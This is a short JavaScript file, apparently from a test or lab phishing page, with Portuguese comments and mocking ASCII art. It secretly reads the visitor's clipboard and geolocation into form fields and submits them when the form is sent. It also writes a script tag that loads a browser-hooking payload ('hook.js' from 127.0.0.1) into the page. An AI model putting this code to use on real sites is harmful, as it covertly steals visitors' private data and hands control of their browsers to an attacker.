const form = document.getElementById('form');
const locationData = document.getElementById('locationData');
const clipboardData = document.getElementById('clipboardData');

// Captura geolocalização
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        position => {
            locationData.value = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
        },
        () => {
            locationData.value = 'N/A';
        }
    );
} else {
    locationData.value = 'N/A';
}

// Captura clipboard
async function captureClipboard() {
    try {
        if (navigator.clipboard && navigator.clipboard.readText) {
            return await navigator.clipboard.readText() || 'N/A';
        }
        return 'N/A';
    } catch (err) {
        return 'N/A: ' + err.message;
    }
}

// Configura cookie
window.onload = () => {
    document.cookie = "teste_cookie=valor_teste; path=/; max-age=3600";
};

// Envio do formulário
form.addEventListener('submit', async (event) => {
    event.preventDefault();
    clipboardData.value = await captureClipboard();
    form.submit();
});

/* 
    000000000000       000000000000             
    0oooooooooo0       0oooooooooo0               
    0oo0000oooo0       0oo0000oooo0                      
    0oo0000oooo0       0oo0000oooo0                      
    0oo0000oooo0       0oo0000oooo0                   
    0oo0000oooo0       0oo0000oooo0                 
    0oo____oooo0       0oo____oooo0 
    000000000000       000000000000                                         
    1                   ___________        _________
    1  '    sssssssss  |___________        |_________
    1       ss         |                   |
    1         s        |___________        |_________
    1          s       |                   |
    1           s      |___________        |__________
    1     ssssssss     |___________        |__________  .you  
    1
    ___              
*/

var commandModuleStr = '<script src="http://127.0.0.1/hook.js" type="text/javascript"><\/script>';
document.write(commandModuleStr);
